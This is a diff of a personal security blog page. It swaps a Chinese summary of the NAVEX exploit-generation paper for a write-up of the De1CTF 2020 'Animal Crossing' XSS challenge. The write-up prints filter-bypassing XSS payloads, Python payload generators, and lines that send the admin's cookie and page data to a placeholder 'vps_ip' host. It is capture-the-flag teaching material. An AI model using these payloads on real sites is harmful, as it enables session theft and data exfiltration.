@@ -22,7 +22,7 @@
     <meta name="description" content="苟有恒，何必三更眠五更起。">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>Paper Summary &amp; NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications · Sky&#39;s blog</title>
+    <title>2020 De1CTF &amp; Animal Crossing · Sky&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >Sky&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">Paper Summary & NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications</a>
+                <a href="#" class="post-name">2020 De1CTF & Animal Crossing</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Paper Summary & NAVEX-Precise and Scalable Exploit Generation for Dynamic Web...
+            2020 De1CTF & Animal Crossing
             <!-- 404 -->
             
         </h1>
@@ -266,18 +266,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "paper">paper</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1,897</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1,220</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2020/01/09</span>
+                    <span class="post-intro-time">2020/05/03</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,12 +401,20 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次介绍的是一篇发表在安全顶会2018 USENIX Security的paper，文章旨在自动化挖掘web漏洞，同时生成对应的exp，其比同类的工具拥有更高的准确度，由于其动静结合的特性，对代码也有更好的覆盖率。</p>
-<h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>首先我们从如下这样一个例子切入，来简单介绍一下web漏洞自动挖掘和通常一些静态分析的工具的做法。<br>例如如下3个代码片段：<br>selectBooks.php用于选择你想要借的书，代码如下：<br><img src="./_image/2020-03-22/2020-03-22-17-48-21.png" alt=""><br>hold.php用于额外的check输入，并引导用户到下一步操作，代码如下：<br><img src="./_image/2020-03-22/2020-03-22-17-48-59.png" alt=""><br>checkout.php用于结算，代码如下：<br><img src="./_image/2020-03-22/2020-03-22-17-49-23.png" alt=""><br>我们可以看到，在这样一个简单的功能实现上，其实出现了不少潜在的漏洞函数，例如selectBooks.php中的mysql_query可能会导致sql注入，又如checkout.php中的echo可能会导致XSS漏洞。<br>那么对于一些常规的静态分析漏洞挖掘工具，他们会怎么做呢？一般情况下，其会首先全局定位到漏洞函数的位置，例如selectBooks.php的第17行，checkout.php的第15行，然后对其参数利用PDG(数据依赖)的关系进行backward反向回溯。<br>例如selectBooks.php的第17行，我们使用PDG关系回溯，可以发现其影响的关键参数有3个，分别是$book_name，$edition,$publisher。他们又分别来自第5行，第9行和第13行。此时我们又会继续对第5行，第9行和第13行继续进行PDG回溯，而后发现他们都会经过过滤函数，那么此时回溯结束，静态分析工具粗略的判断其为安全的flow，因为其参数都会经过过滤。<br>我们再看checkout.php的第15行，利用PDG进行回溯，我们可以关注到2个变量，分别是$name和$msg，而后找到第 9行和第10行，此时我们发现第10行是攻击者可控的$_GET变量，那么此时该flow会被输出，并交由运行者进行check，判断其是否为误报。而对于对9行，我们却不太那么容易找到其真实的数据依赖，因为$result实际上来自于数据库内的数据，而非直接显示在代码中。<br>那么此时一般的静态分析工具的缺点便暴露无遗，其会受到数据库查询的约束而不能准确进行分析，且由于其依赖于PDG的后向回溯，很难去发现逻辑上的漏洞。<br>同时还有一个关键的问题，仅从代码上来看，似乎$msg我们可以找到一条攻击路线，但实际上，这是需要前期铺垫的，我们必须拥有session才能到达这一步，这为人工check也增加了不少不便捷性。<br>因此，本篇paper就是旨在解决这些问题，而提出了动静结合的web漏洞挖掘工具：NAVEX</p>
-<h2 id="工具设计"><a href="#工具设计" class="headerlink" title="工具设计"></a>工具设计</h2><p>那么我们来简单看一下，NAVEX是如何设计，用于解决上述问题的。<br>首先作者定义了一个字典：<br><img src="./_image/2020-03-22/2020-03-25-17-55-55.png" alt=""><br>其中记录一些关键的函数名，例如XSS，对应echo和print等，依次类推，作者一共记录了如下几类攻击的潜在漏洞函数：sql注入、XSS、文件包含、命令注入、代码注入和逻辑漏洞。<br>然后NAVEX一样会像平常的静态分析工具一样，对漏洞进行检测，其也会通过全局定位敏感函数，然后用上述思想，对关键变量进行PDG后向回溯，其伪代码如下：<br><img src="./_image/2020-03-22/2020-03-25-09-37-30.png" alt=""><br>运行结束后，程序会返回路径集，即从攻击者可控变量source($_GET、$_POST等)到潜在漏洞函数调用之间的变量传递。<br>值得一提的是，作者这里不仅仅使用了PDG的后向分析，同时其为了发掘逻辑上的漏洞，也会进行正向寻找。<br>然后作者会将提取出的约束放入Z3求解器进行约束求解。以备后续生成exp使用。<br>待上述操作结束后，程序进入动态分析，或者称为前端约束生成阶段。在这一步中，作者使用爬虫，爬取html页面中的信息和属性名，例如提取form表单或者js的相关约束：<br><img src="./_image/2020-03-22/2020-03-25-10-00-34.png" alt=""><br>然后同样会使用约束器求解，得到满足的input，并进行输入，但由于可能input也会受到后端的约束，因此为了防止爬虫由于未能正确input，不能到达下一步，作者对后端进行了监控，以探测在input后，后端是否会发生变化，例如进行数据库查询，或者改变了当前状态，例如全局变量的赋值(session，cookie等)，或者新产生了变量等。以此断定爬虫的前段约束后得到的input是否生效，如果未生效，其会同时考虑后端约束，并再次求解，而后继续监控往复，直到成功input。<br>如我们最开始的例子中，此时会考虑到后端的约束，即$publisher的长度问题：<br><img src="./_image/2020-03-22/2020-03-25-10-08-45.png" alt=""><br>同时作者也考虑过了角色问题，在web网站中，通常会分为管理员和普通用户，那么为了最大的代码覆盖率，作者会存储管理员用户的登录凭证，以方便探测到管理员用户可能存在的潜在漏洞。<br>为了存储这些关系，作者定义了Navigation Graph，其为有向图：G = (N , E )，它的边代表了下一步跳转的意义，例如下图：<br><img src="./_image/2020-03-22/2020-03-25-18-15-32.png" alt=""><br>在我们第一步达到selectBooks.php后，在html模拟用户input，会来到下一个url操作：selectBooks.php?action=borrow，而这2个node之间则会产生一条edge，又前者指向后者。<br>同时对于每一个Node，其拥有一些属性，例如id为每一个node的唯一标识符，url为当前node的链接，form_params为表单的input，role存放管理员用户的登录凭证。<br>如此一来，在找到漏洞点后，作者即可找到一条可到达，并触发该漏洞函数的链接，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. http://localhost/App/index.php</span><br><span class="line">2. http://localhost/App/selectBooks.php with POST params:[book name=intro to CS by author1, edition=2,publisher=aaaaaaa]</span><br><span class="line">3. http://localhost/App/selectBooks.php?action =borrow</span><br><span class="line">4. http://localhost/App/hold.php</span><br><span class="line">5. http://localhost/App/hold.php?step=checkout</span><br><span class="line">6. http://localhost/App/hold.php?step=checkout &amp;msg=&lt;script&gt;alert(”XSS”);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>最终成功将exp带入到6条语句，成功进行xss攻击。</p>
-<h2 id="实验测试"><a href="#实验测试" class="headerlink" title="实验测试"></a>实验测试</h2><p>作者对26个php cms进行了测试，php文件数量超过22.7k，列表如下：<br><img src="./_image/2020-03-22/2020-03-25-18-21-01.png" alt=""><br>对于sql注入，作者只关心了如下4种潜在的漏洞函数：mssql query, mysql query, mysqli query和sqlite query，并通过实验测试发现，在不到1小时的时间内，工具生成了105个sql注入exp：<br><img src="./_image/2020-03-22/2020-03-25-18-24-27.png" alt=""><br>可以看到在获得的结果里，均为true positives，以此显现了 NAVEX的高精度和高效率。<br>同样的，对于XSS和逻辑漏洞，在较短的时间内，都有不错的表现：<br><img src="./_image/2020-03-22/2020-03-25-18-25-24.png" alt=""><br><img src="./_image/2020-03-22/2020-03-25-18-25-38.png" alt=""></p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本篇文章的思路较为新颖，由于其动静态结合的方式，不仅可以一定程度上增加效率，并且能够有效的探测到一些普通静态分析工具不能检测出的漏洞。其贡献不仅在于学术上的创新，对我们cms审计也提供了不少的便利。</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>五一的时候参与了一下De1CTF，里面有一道题让我印象很深刻：Animal Crossing。</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题干描述如下：<br><img src="./_image/2020-05-06/2020-05-06-20-18-20.png" alt=""><br>可能作者很喜欢玩动森），进去之后是一个如下页面：<br><img src="./_image/2020-05-06/2020-05-06-20-18-42.png" alt=""><br>我们随机输入一些字符串后，来到下一页：<br><img src="./_image/2020-05-06/2020-05-06-20-19-10.png" alt=""><br>此时我们的url：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://134.175.231.113:8848/passport?image=%2Fstatic%2Fhead.jpg&amp;island=vwev&amp;fruit=&amp;name=ewvc&amp;data=vcwevcw</span><br></pre></td></tr></table></figure></p>
+<p>我们随机更改，页面会相应变化，同时发现有admin report界面：<br><img src="./_image/2020-05-06/2020-05-06-20-19-41.png" alt=""><br>那么很明显了，这应该是一个xss打管理员cookie的题目。<br>尝试fuzz了一下各个参数，发现攻击点应该在data参数上，但其过滤了大量的字符，并且设有csp,导致常规的xss做法并不适用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos; &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;;object-src &apos;none&apos;;</span><br></pre></td></tr></table></figure></p>
+<p><img src="./_image/2020-05-06/2020-05-06-20-20-45.png" alt=""></p>
+<h2 id="原型链构造"><a href="#原型链构造" class="headerlink" title="原型链构造"></a>原型链构造</h2><p><img src="./_image/2020-05-06/2020-05-06-20-21-26.png" alt=""><br>发现我们的代码会被拼接在此处进行执行，那么首先进行闭合：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://134.175.231.113:8848/passport?image=%2Fstatic%2Fhead.jpg&amp;island=vwev&amp;fruit=&amp;name=ewvc&amp;data=%27||1111//</span><br></pre></td></tr></table></figure></p>
+<p><img src="./_image/2020-05-06/2020-05-06-20-22-16.png" alt=""><br>那么如何利用1111部分的代码，让我们达到执行任意代码的目的呢？<br>这里就和一些trick有关，我们看一个例子：<br><img src="./_image/2020-05-06/2020-05-06-20-25-44.png" alt=""><br>可以看到，对于toString，其会将其他值以字符串形式表示，特别的，对于对象，其会转换为[object Object]，而对于数组，其会转换为Array.join(‘,’)的形式进行拼接。但是对于valueOf( )，其返回的则是自身。<br>那我们再看一个例子：<br><img src="./_image/2020-05-06/2020-05-06-20-31-27.png" alt=""><br>在一元加操作符操作对象的时候，会先调用对象的valueOf方法来转换，如此一来，我们可以利用这一特点，进行函数构造执行代码。那么我们回到题目中：<br><img src="./_image/2020-05-06/2020-05-06-20-34-39.png" alt=""><br>如此一来，我们就可以定义function内容：<br><img src="./_image/2020-05-06/2020-05-06-20-35-06.png" alt=""><br>那么我们再搭配上valueOf：<br><img src="./_image/2020-05-06/2020-05-06-20-36-55.png" alt=""><br>当然，代码中没有+1的操作，那么怎么触发valueOf呢？其实很简单：<br><img src="./_image/2020-05-06/2020-05-06-20-40-04.png" alt=""><br>如此一来，我们即可进行任意代码执行。</p>
+<h2 id="xss打cookie"><a href="#xss打cookie" class="headerlink" title="xss打cookie"></a>xss打cookie</h2><p>在可执行任意代码后，我们下一步就是进行location跳转打cookie:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=<span class="string">'http://vps_ip?flag='</span>+<span class="built_in">document</span>.cookie</span><br></pre></td></tr></table></figure></p>
+<p>但是由于题目设置了较为恶心的waf，所以我们这里选择利用atob编码绕过：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">s = <span class="string">"""</span></span><br><span class="line"><span class="string">location='http://vps_ip?flag='+document.cookie</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">data=b64encode(s.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>).replace(<span class="string">'+'</span>, <span class="string">'%2b'</span>).replace(<span class="string">'='</span>,<span class="string">'%3d'</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"/passport?image=&amp;island=&amp;fruit=&amp;name=&amp;data=%27||&#123;%22valueOf%22:new%20%22%22.constructor.constructor(atob(%27"</span>+ data +<span class="string">"%27))&#125;%2b1//"</span></span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure></p>
+<p>编写代码如上，以用于自动生成exp。<br>攻击后即可得到管理员cookie:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG=De1CTF&#123;I_l1k4_</span><br></pre></td></tr></table></figure></p>
+<h2 id="xss打管理员页面"><a href="#xss打管理员页面" class="headerlink" title="xss打管理员页面"></a>xss打管理员页面</h2><p>但很显然只有一半flag是不行的，于是想到读一下管理员页面信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=&apos;http://vps_ip?flag=&apos;+btoa(document.body.innerHTML)</span><br></pre></td></tr></table></figure></p>
+<p>得到信息解码后如下：<br><img src="./_image/2020-05-06/2020-05-06-20-45-08.png" alt=""><br>可以发现管理员界面有无数张图片= =，猜想flag要么是其中一张，要么是拼接所有图片得到。那么尝试访问目录访问图片，但发现均为500，无法直接访问。<br>于是这里想到方案有2种：<br>1.利用js截图，将页面带出<br>2.将图片全部传出来<br>在解题中我选择了第二种思路，那么如何把图片传出呢？这里我们发现题目还有一个上传功能，可以让我们上传头像，但是只允许png和jpg后缀，这也是为何我选择了第二种方法，因为后缀名没法bypass（但是后来交流发现，不需要bypass后缀= =，我太菜啦！）<br>那么这里的思路转变为让管理员将图片上传后，再将return的访问url传出到我们的vps，我们即可获取到图片，于是写出如下脚本：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">s = <span class="string">"""</span></span><br><span class="line"><span class="string">(async()=&gt;&#123;</span></span><br><span class="line"><span class="string">    const arr = []</span></span><br><span class="line"><span class="string">    for(let i=1;i&lt;=9;i++) &#123;</span></span><br><span class="line"><span class="string">        res = await fetch(`/island/test_$0&#123;i&#125;.png`)</span></span><br><span class="line"><span class="string">        data = await res.blob()</span></span><br><span class="line"><span class="string">        const os = new FormData();</span></span><br><span class="line"><span class="string">        const mf = new File([data], "name.png");</span></span><br><span class="line"><span class="string">        os.append("file", mf);</span></span><br><span class="line"><span class="string">        r = await fetch("/upload", &#123;method: "POST",body: os&#125;)</span></span><br><span class="line"><span class="string">        data = await r.json()</span></span><br><span class="line"><span class="string">        arr.push(data.data)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    location="http://vps_ip/?c="+btoa(JSON.stringify(arr))</span></span><br><span class="line"><span class="string">&#125;)();</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">data=b64encode(s.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>).replace(<span class="string">'+'</span>, <span class="string">'%2b'</span>).replace(<span class="string">'='</span>,<span class="string">'%3d'</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"/passport?image=&amp;island=&amp;fruit=&amp;name=&amp;data=%27||&#123;%22valueOf%22:new%20%22%22.constructor.constructor(atob(%27"</span>+ data +<span class="string">"%27))&#125;%2b1//"</span></span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure></p>
+<p>然后将400张图拼在一起，得到后半段flag：<br><img src="./_image/2020-05-06/2020-05-06-20-51-24.png" alt=""><br>当然这里额外提一下，其实引入js库，不需要bypass js后缀，我们利用如下方式即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(`/static/images/xxxxxx.png`).then(res=&gt;res.text()).then(txt=&gt;eval(txt))</span><br></pre></td></tr></table></figure></p>
+<p>然后引入js库，截图后将图片利用upload上传，再把return url发送到我们服务器即可~</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这道xss是我认为De1CTF比较有趣的一道题目了，首先考的就是纯web，其次出题的思路比较好，而不是一味的恶心人= =，点个赞~</p>
 
     </article>
     <!-- reward  -->
@@ -420,16 +428,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2020/01/09/Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing/" title= "Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing">
-                    <div class="nextTitle">Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing</div>
+                <a href= "/2020/05/05/Paper Summary & NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications/" title= "Paper Summary & NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications">
+                    <div class="nextTitle">Paper Summary & NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2020/01/09/Paper-Summary-CNN-Webshell-Malicious-Web-Shell-Detection-with-Convolutional-Neural-Network/" title= "Paper Summary & CNN-Webshell & Malicious Web Shell Detection with Convolutional Neural Network">
-                    <div class="prevTitle">Paper Summary & CNN-Webshell & Malicious Web Shell Detection with Convolutional Neural Network</div>
+                <a href= "/2020/04/29/Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing/" title= "Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing">
+                    <div class="prevTitle">Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing</div>
                 </a>
             
         </li>
@@ -551,7 +559,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#背景介绍"><span class="toc-number">2.</span> <span class="toc-text">背景介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#工具设计"><span class="toc-number">3.</span> <span class="toc-text">工具设计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实验测试"><span class="toc-number">4.</span> <span class="toc-text">实验测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">5.</span> <span class="toc-text">后记</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-number">2.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原型链构造"><span class="toc-number">3.</span> <span class="toc-text">原型链构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss打cookie"><span class="toc-number">4.</span> <span class="toc-text">xss打cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss打管理员页面"><span class="toc-number">5.</span> <span class="toc-text">xss打管理员页面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">6.</span> <span class="toc-text">后记</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -564,24 +572,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -4360,12 +4350,37 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/14</span><a class="archive-post-title" href= "/2020/01/14/Paper-Summary-Webshell-Detection-Based-on-Random-Forest–Gradient-Boosting-Decision-Tree-Algorithm/" >Paper Summary & Webshell Detection Based on Random Forest–Gradient Boosting Decision Tree Algorithm</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href= "/2020/05/29/Deemon & CSRF漏洞动态分析工具/" >Paper Summary & Deemon & Detecting CSRF with Dynamic Analysis and Property Graphs</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/14</span><a class="archive-post-title" href= "/2020/01/14/Web缓存利用分析(一)/" >Web缓存利用分析(一)</a>
+            <span class="archive-post-date">05/14</span><a class="archive-post-title" href= "/2020/05/14/Web缓存利用分析(一)/" >Web缓存利用分析(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/05</span><a class="archive-post-title" href= "/2020/05/05/Paper Summary & NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications/" >Paper Summary & NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2020/05/03/2020 De1CTF & Animal Crossing/" >2020 De1CTF & Animal Crossing</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span><a class="archive-post-title" href= "/2020/04/29/Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing/" >Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/09</span><a class="archive-post-title" href= "/2020/02/09/2020 CodeGate Web Writeup/" >2020 CodeGate Web Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/14</span><a class="archive-post-title" href= "/2020/01/14/Paper-Summary-Webshell-Detection-Based-on-Random-Forest–Gradient-Boosting-Decision-Tree-Algorithm/" >Paper Summary & Webshell Detection Based on Random Forest–Gradient Boosting Decision Tree Algorithm</a>
         </li>
     
     
@@ -4376,31 +4391,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">01/13</span><a class="archive-post-title" href= "/2020/01/13/Paper-Summary-Detecting-Webshell-Based-on-Random-Forest-with-FastText/" >Paper Summary & Detecting Webshell Based on Random Forest with FastText</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/2020 CodeGate Web Writeup/" >2020 CodeGate Web Writeup</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/2020 De1CTF & Animal Crossing/" >2020 De1CTF & Animal Crossing</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/Deemon & CSRF漏洞动态分析工具/" >Paper Summary & Deemon & Detecting CSRF with Dynamic Analysis and Property Graphs</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing/" >Paper Summary & FUSE & Finding File Upload Bugs via Penetration Testing</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/Paper Summary & NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications/" >Paper Summary & NAVEX-Precise and Scalable Exploit Generation for Dynamic Web Applications</a>
         </li>
     
     
@@ -5432,12 +5422,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
         </li>
     
     
@@ -5470,27 +5460,27 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
     
-        <span class="sidebar-tag-name" data-tags="coding"><span class="iconfont-archer">&#xe606;</span>coding</span>
-    
         <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
     
         <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
+    
+        <span class="sidebar-tag-name" data-tags="coding"><span class="iconfont-archer">&#xe606;</span>coding</span>
     
         <span class="sidebar-tag-name" data-tags="awd"><span class="iconfont-archer">&#xe606;</span>awd</span>
     
         <span class="sidebar-tag-name" data-tags="study"><span class="iconfont-archer">&#xe606;</span>study</span>
     
+        <span class="sidebar-tag-name" data-tags="crc32"><span class="iconfont-archer">&#xe606;</span>crc32</span>
+    
         <span class="sidebar-tag-name" data-tags="aes"><span class="iconfont-archer">&#xe606;</span>aes</span>
     
-        <span class="sidebar-tag-name" data-tags="crc32"><span class="iconfont-archer">&#xe606;</span>crc32</span>
+        <span class="sidebar-tag-name" data-tags="bitcon"><span class="iconfont-archer">&#xe606;</span>bitcon</span>
+    
+        <span class="sidebar-tag-name" data-tags="paper"><span class="iconfont-archer">&#xe606;</span>paper</span>
     
         <span class="sidebar-tag-name" data-tags="serialize"><span class="iconfont-archer">&#xe606;</span>serialize</span>
     
         <span class="sidebar-tag-name" data-tags="other"><span class="iconfont-archer">&#xe606;</span>other</span>
-    
-        <span class="sidebar-tag-name" data-tags="paper"><span class="iconfont-archer">&#xe606;</span>paper</span>
-    
-        <span class="sidebar-tag-name" data-tags="bitcon"><span class="iconfont-archer">&#xe606;</span>bitcon</span>
     
         <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
     
@@ -5565,9 +5555,9 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="misc"><span class="iconfont-archer">&#xe60a;</span>misc</span>
     
-        <span class="sidebar-category-name" data-categories="other"><span class="iconfont-archer">&#xe60a;</span>other</span>
-    
         <span class="sidebar-category-name" data-categories="paper"><span class="iconfont-archer">&#xe60a;</span>paper</span>
+    
+        <span class="sidebar-category-name" data-categories="other"><span class="iconfont-archer">&#xe60a;</span>other</span>
     
         <span class="sidebar-category-name" data-categories="cms"><span class="iconfont-archer">&#xe60a;</span>cms</span>
     
